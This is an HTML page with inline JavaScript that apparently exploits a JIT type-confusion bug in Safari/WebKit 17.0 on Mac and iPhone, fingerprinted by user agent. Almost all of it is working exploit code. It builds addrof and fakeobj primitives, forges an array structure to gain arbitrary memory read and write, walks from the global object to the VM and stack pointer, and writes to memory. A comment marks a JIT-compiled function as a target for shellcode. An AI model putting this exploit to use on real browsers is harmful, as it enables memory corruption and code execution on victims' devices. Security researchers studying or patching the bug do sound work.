<!DOCTYPE html>
<html>
<body>
<script src="/util.js"></script>
<script src="/int64.js"></script>
<script>

const ITERATIONS = 100000;

let ab = new ArrayBuffer(8);
let farray = new Float64Array(ab);
let uarray = new Uint32Array(ab);

function f2i(f) {
    farray[0] = f;
    return [uarray[0],uarray[1]]
}

function i2f(lo,hi) {
    uarray[0] = lo;
    uarray[1] = hi;
    return farray[0];
}

function gc() {
    for (let i = 0; i < 0x10; i++) {
        new ArrayBuffer(0x1000000)
    }
}
function jitCompile(f, ...args) {
    for (var i = 0; i < ITERATIONS; i++) {
        f(...args);
    }
}
jitCompile(function dummy() { return 42; });
function makeJITCompiledFunction() {
    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    jitCompile(target, 123);
    return target;
}
var func = makeJITCompiledFunction();

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};
let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;
let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}
let shapes = [];
for (let i = 0; i < 0x1000; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;
    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;
    function get_getterSetter(type) {
        let o, retval;
        if (type == 0) o = object_a;
        else o = object_b;
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

(function pwn() {
    gc();
    var getter, getterSetter;
    for (let i = 1; i <= ITERATIONS; i++) {
        [getter, getterSetter] = trigger();
        try {
            getterSetter.toString();
        } catch(e) {
            break;
        }
    }
    if (getterSetter == undefined) {
        document.write("<h1>Failed to trigger getterSetter!</h1>");
        return;
    }
    document.write("<h1>Triggered getterSetter!</h1>");
    let symbolObject = Object(getterSetter);
    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
    let factor;
    let unknown_device = false;
    if (isMac && version == '17.0') {
        factor = 840;
    } else if (isIphone && version == '17.0') {
        factor = 87;
    } else {
        factor = 87 + Math.floor(Math.random() * 1000);
        unknown_device = true;
    }
    document.write("<h1>factor: " + factor + "</h1>");
    let ref_arr = [];
    for (let i = 0; i < factor; ++i) {
        ref_arr.push(symbolObject.description);
    }
    getter.p13 = 1.1;
    let unboxed_arr = getter;
    function addrof(o) {
        boxed_arr[8] = o;
        return Int64.fromDouble(unboxed_arr[0]);
    }
    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        return boxed_arr[8];
    }
    function isVulnerable() {
        let base = addrof({}).asDouble();
        if (!isNaN(base)) {
            let base_fake = fakeobj(Int64.fromDouble(base));
            if (base_fake.__proto__ == Object.prototype) {
                let t = {b: 42};
                let a = addrof(t);
                if (fakeobj(addrof(t)) !== t) {
                    return false;
                } else {
                    return true;
                }
            }
        }
        return false;
    }
    if (isVulnerable()) {
        document.write("<h1>Passed addrof and fakeobj check!</h1>");
        var structs = []
        for (var i = 0; i < 0x1000; ++i) {
            var array = [13.37];
            array.pointer = 1234;
            array['prop' + i] = 13.37;
            structs.push(array);
        }
        var victim = structs[0x800];
        var victim_addr = addrof(victim);
        document.write("<h1>Victim addr: " + victim_addr + "</h1>");
        var flags_double_array = new Int64("0x0108200700001000").asJSValue();
        var container = {
            header: flags_double_array,
            butterfly: victim
        };
        var containerAddr = addrof(container);
        document.write("<h1>Container addr: " + containerAddr + "</h1>");
        var hax = fakeobj(Add(containerAddr, 0x10));
        var origButterfly = hax[1];
        document.write("<h1>origButterfly: " + origButterfly + "</h1>");
        var memory = {
            addrof: addrof,
            fakeobj: fakeobj,
            writeInt64(addr, int64) {
                hax[1] = Add(addr, 0x10).asDouble();
                victim.pointer = int64.asJSValue();
            },
            write16(addr, value) {
                hax[1] = Add(addr, 0x10).asDouble();
                victim.pointer = value;
            },
            write(addr, data) {
                while (data.length % 4 != 0)
                    data.push(0);
                var bytes = new Uint8Array(data);
                var ints = new Uint16Array(bytes.buffer);
                for (var i = 0; i < ints.length; i++)
                    this.write16(Add(addr, 2 * i), ints[i]);
            },
            read64(addr) {
                hax[1] = Add(addr, 0x10).asDouble();
                return this.addrof(victim.pointer);
            },
            test() {
                var v = {};
                var obj = {p: v};
                var addr = this.addrof(obj);
                var propertyAddr = Add(addr, 0x10);
                var value = this.read64(propertyAddr);
                this.write16(propertyAddr, 0x1337);
                if (obj.p == 0x1337) {
                    return true;
                } else {
                    return false;
                }
            },
        };
        var plainObj = {};
        var header = memory.read64(addrof(plainObj));
        memory.writeInt64(memory.addrof(container), header);
        if (memory.test()) {
            document.write("<h1>Achieved limited arbitrary read/write!</h1>");
            let global = Function('return this')();
            let js_glob_obj_addr = addrof(global);
            document.write("<h1>js_glob_obj_addr: " + js_glob_obj_addr + "</h1>");
            let glob_obj_addr = memory.read64(Add(js_glob_obj_addr, 0x18));          // JS_GLOBAL_OBJ_TO_GLOBAL_OBJ
            document.write("<h1>glob_obj_addr: " + glob_obj_addr + "</h1>");
            let vm_addr = memory.read64(Add(glob_obj_addr, 0x8));                    // GLOBAL_OBJ_TO_VM
            document.write("<h1>vm_addr: " + vm_addr + "</h1>");
            let vm_top_call_frame_addr = Add(vm_addr, 0x10);                         // VM_TO_TOP_CALL_FRAME
            document.write("<h1>vm_top_call_frame_addr: " + vm_top_call_frame_addr + "</h1>");
            let vm_top_call_frame_addr_dbl = vm_top_call_frame_addr.asDouble();
            let stack_ptr = memory.read64(vm_top_call_frame_addr);
            document.write("<h1>stack_ptr: " + stack_ptr + "</h1>");
            let base = new Int64('0x0000007fffffffff');
            memory.write(base, [0x1337, 0x1337, 0x1337, 0x1337]);
        } else {
            document.write("<h1>Failed memory test!</h1>");
            return;
        }
    } else {
        document.write("<h1>Failed addrof and fakeobj check!</h1>");
        return;
    }
})();

</script>
</body>
</html>